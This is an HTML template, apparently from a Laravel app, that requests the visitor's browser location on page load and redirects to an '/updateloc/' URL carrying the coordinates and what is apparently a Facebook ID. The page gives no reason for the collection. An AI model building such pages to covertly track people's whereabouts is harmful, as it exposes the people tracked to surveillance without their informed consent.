<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">

    <title>Hello, world!</title>
  </head>
  <body>
    <div class="jumbotron">
      <h1 class="display-4">Getting Location</h1>
      <p class="lead">Please wait</p>
      <hr class="my-4">
      <p>Please allow location service.</p>
    </div>

    <p id="display"></p>

  <script>
  var x = document.getElementById("display");

  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    } else { 
      x.innerHTML = "Geolocation is not supported by this browser.";
    }
  }

  function showPosition(position) {
    x.innerHTML = "Latitude: " + position.coords.latitude + 
    "<br>Longitude: " + position.coords.longitude;

    window.location.replace('{{ $url }}/updateloc/{{ $fb_id }}/'+position.coords.longitude+'/'+position.coords.latitude);
  }

  window.onload = function() {
      getLocation();
  };
  </script>

  </body>
</html>
